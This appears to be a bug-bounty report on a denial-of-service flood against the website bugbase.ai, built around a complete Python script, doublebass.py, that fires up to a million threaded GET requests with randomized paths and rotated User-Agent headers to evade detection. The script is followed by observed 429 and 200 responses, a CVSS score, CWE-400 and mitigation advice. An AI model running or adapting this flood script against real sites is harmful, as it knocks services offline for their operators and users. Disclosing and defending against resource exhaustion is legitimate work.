### Report: DDoS through Resource Exhaustion Using `doublebass.py`

#### Overview

This report details a Distributed Denial of Service (DDoS) attack executed through resource exhaustion using a Python script (`doublebass.py`). The attack targets the website `https://bugbase.ai`, aiming to overload its resources and deny legitimate access. The script generates a high volume of GET requests using randomly generated URLs, leveraging multi-threading to maximize impact.

#### Attack Description

**Script: `doublebass.py`**
- The script sends a large number of GET requests to the target URL with randomized suffixes.
- It utilizes multi-threading to create parallel requests, significantly increasing the load on the target server.
- User-Agent headers are rotated to mimic requests from different devices and platforms, making detection harder.
- The script can be configured to repeat the attack a specified number of times (set to 1,000,000 in the example).

```python
import requests
import threading
import random
import string
import time

# Base URL pattern with a placeholder for the random suffix
base_url_pattern = "https://bugbase.ai/dashboard/reports/{suffix}"

# Function to generate random suffixes
def generate_random_suffix(length=24):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# List of user agents to rotate through
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',

    # Add more user agents as needed
]

# Number of times to repeat the attack
repeat = 1000000  # Set this to a large number for a heavier attack simulation

# Function to perform the GET request
def perform_get_request(base_url_pattern, headers, i):
    try:
        random_suffix = generate_random_suffix()
        url = base_url_pattern.format(suffix=random_suffix)

        response = requests.get(url, headers=headers)

        # Print out the response code, final URL after redirect, and the payload used
        print(f"Attempt {i + 1}: Requested URL {url} - Final URL: {response.url} - Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error occurred: {e}")

# Function to handle threading
def get_with_threads(base_url_pattern, repeat):
    threads = []
    for i in range(repeat):
        headers = {
            'User-Agent': user_agents[i % len(user_agents)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
        }

        if len(threads) >= 100:  # Manage thread count
            for thread in threads:
                thread.join()
            threads = []

        thread = threading.Thread(target=perform_get_request, args=(base_url_pattern, headers, i))
        threads.append(thread)
        thread.start()

     #   time.sleep(0.001)  # Optional delay to manage rate-limiting

    # Wait for all remaining threads to complete
    for thread in threads:
        thread.join()

# Example usage
if __name__ == "__main__":
    get_with_threads(base_url_pattern, repeat)
```
  
**Observed Behavior:**
- The attack led to HTTP 429 errors (`Too Many Requests`), indicating the server's rate-limiting mechanisms were triggered.
- Successful status code 200 responses were also observed, indicating some requests bypassed the rate-limiting temporarily.

   This screenshot captures the script's execution on a mobile device, showing numerous GET requests sent to `https://bugbase.ai` and corresponding status codes.

#### Impact Assessment

**Potential Impact:**
- **Resource Depletion:** The flood of requests can deplete server resources, including CPU, memory, and bandwidth, potentially causing downtime.
- **Service Disruption:** Legitimate users may be unable to access the website, leading to a loss of business, reputation damage, and potential financial losses.

**CVSS Score:**
- **Base Score:** 7.5 (High)
- **Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
- **Explanation:** The attack is remotely exploitable with low complexity, requiring no authentication. It primarily affects the availability of the target website without compromising confidentiality or integrity.

**CWE ID:**
- **CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion')**
  - **Description:** The vulnerability occurs when an attacker can send a large number of requests or cause significant processing overhead, leading to resource exhaustion on the server.

#### Conclusion

The `doublebass.py` script effectively simulates a DDoS attack through resource exhaustion, impacting the availability of `https://bugbase.ai`. The attack triggers rate-limiting mechanisms but continues to overload the server, causing intermittent service disruptions. To mitigate such attacks, implementing stronger rate-limiting, IP blacklisting, and using a content delivery network (CDN) with DDoS protection are recommended.

#### Recommendations:
- **Rate Limiting:** Strengthen the existing rate-limiting rules to block repetitive requests more aggressively.
- **DDoS Mitigation Services:** Implement DDoS protection services such as Cloudflare or AWS Shield to absorb and filter malicious traffic.
- **Server Hardening:** Optimize server configurations to handle a higher volume of requests without resource depletion.
